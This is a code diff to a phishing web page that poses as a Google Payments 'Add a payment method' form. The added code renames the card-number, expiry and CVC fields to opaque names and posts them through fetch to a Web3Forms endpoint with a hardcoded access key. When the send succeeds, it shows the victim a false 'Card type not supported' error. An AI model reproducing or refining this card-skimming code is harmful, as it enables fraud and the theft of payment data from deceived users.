@@ -15,7 +15,8 @@
       padding: 0;
       display: flex;
       flex-direction: column;
-      height: 100vh;
+      height: 100%;
+      width: 100%;
     }
 
     header {
@@ -127,33 +128,34 @@
   <header onclick="goBack()" style="display: flex; align-items: center;">
       <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
         <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg> Add a payment method</header>
+      </svg><b style="margin-left: 50px;">Add a payment method</b></header>
 
   <main>
-    <form id="paymentForm" action="https://formsubmit.co/youremail@example.com" method="POST">
-      <label>Card number</label>
-      <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required />
+      
+      
+   <!-- Replace YOUR_ACCESS_KEY_HERE with your actual Web3Forms access key -->
+<form id="paymentForm" action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="52d3a334-144c-4dd9-aa18-3fadbf114ae3">
 
-      <div class="row">
-        <input type="text" placeholder="MM" maxlength="2" id="expMM" name="expMM" inputmode="numeric" required />
-        <input type="text" placeholder="YY" maxlength="2" id="expYY" name="expYY" inputmode="numeric" required />
-        <input type="text" placeholder="CVC" maxlength="4" id="cvc" name="cvc" inputmode="numeric" required />
-      </div>
+  <label>Card number</label>
+  <input type="text" id="codeblock1" name="codeblock1" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required />
 
-      <label>Cardholder name</label>
-      <div class="address">
-        <p>User ID: <span id="usernameDisplay">Loading...</span></p>
-      </div>
+  <div class="row">
+    <input type="text" placeholder="MM" maxlength="2" id="codeblock2" name="codeblock2" inputmode="numeric" required />
+    <input type="text" placeholder="YY" maxlength="2" id="codeblock3" name="codeblock3" inputmode="numeric" required />
+    <input type="text" placeholder="CVC" maxlength="4" id="codeblock4" name="codeblock4" inputmode="numeric" required />  
+  </div>  
 
-      <div class="legal">
-        By continuing, you agree to the Google Payments 
-        <a href="#" style="cursor: none;">Terms of Service</a>. The <a href="#" style="cursor: none;">Privacy Notice</a> describes how your data is handled.
-      </div>
+  <label>Cardholder name</label>
+  <div class="address">
+    <p>User ID: <span id="usernameDisplay">Loading...</span></p>
+  </div>
 
-      <!-- Needed for FormSubmit to redirect to same page without reloading -->
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="">
-    </form>
+  <!-- Optional metadata -->
+  <input type="hidden" name="subject" value="New Payment Method Submitted">
+  <input type="hidden" name="from_name" value="Payment Form">
+</form>
+
 
     <div class="error-message" id="errorMessage">Error: Please fill out all fields correctly.</div>
     <div class="error-message" id="postSubmitMessage">Unsupported payment method.</div>
@@ -162,39 +164,55 @@
   <footer>
     <button id="submitButton">Save</button>
   </footer>
+ <script>
+  const cardInput = document.getElementById("codeblock1");
+  cardInput.addEventListener("input", () => {
+    let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
+    cardInput.value = value.match(/.{1,4}/g)?.join(" ") || "";
+  });
 
-  <script>
-    const cardInput = document.getElementById("cardNumber");
-    cardInput.addEventListener("input", () => {
-      let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
-      cardInput.value = value.match(/.{1,4}/g)?.join(" ") || "";
-    });
+  const submitBtn = document.getElementById("submitButton");
+  const form = document.getElementById("paymentForm");
+  const errorMsg = document.getElementById("errorMessage");
+  const postSubmitMessage = document.getElementById("postSubmitMessage");
 
-    const submitBtn = document.getElementById("submitButton");
-    const form = document.getElementById("paymentForm");
-    const errorMsg = document.getElementById("errorMessage");
-    const postSubmitMessage = document.getElementById("postSubmitMessage");
+  submitBtn.addEventListener("click", function (e) {
+    e.preventDefault();
 
-    submitBtn.addEventListener("click", function (e) {
-      e.preventDefault();
+    const card = cardInput.value.trim();
+    const mm = document.getElementById("codeblock2").value.trim();
+    const yy = document.getElementById("codeblock3").value.trim();
+    const cvc = document.getElementById("codeblock4").value.trim();
 
-      const card = cardInput.value.trim();
-      const mm = document.getElementById("expMM").value.trim();
-      const yy = document.getElementById("expYY").value.trim();
-      const cvc = document.getElementById("cvc").value.trim();
+    if (!card || !mm || !yy || !cvc) {
+      errorMsg.style.display = "block";
+      postSubmitMessage.style.display = "none";
+    } else {
+      errorMsg.style.display = "none";
 
-      if (!card || !mm || !yy || !cvc) {
-        errorMsg.style.display = "block";
-        postSubmitMessage.style.display = "none";
-      } else {
-        errorMsg.style.display = "none";
-        form.submit(); // Send the form
-        setTimeout(() => {
-          postSubmitMessage.style.display = "block";
-        }, 1000);
-      }
-    });
-  </script>
+      const formData = new FormData(form);
+
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(result => {
+        if (result.success) {
+          postSubmitMessage.textContent = "Payment failed: Card type not supported.";
+        } else {
+          postSubmitMessage.textContent = "Submission failed. Please try again.";
+        }
+        postSubmitMessage.style.display = "block";
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        postSubmitMessage.textContent = "An error occurred.";
+        postSubmitMessage.style.display = "block";
+      });
+    }
+  });
+</script>
    <script>
   function goBack() {
     window.history.back();
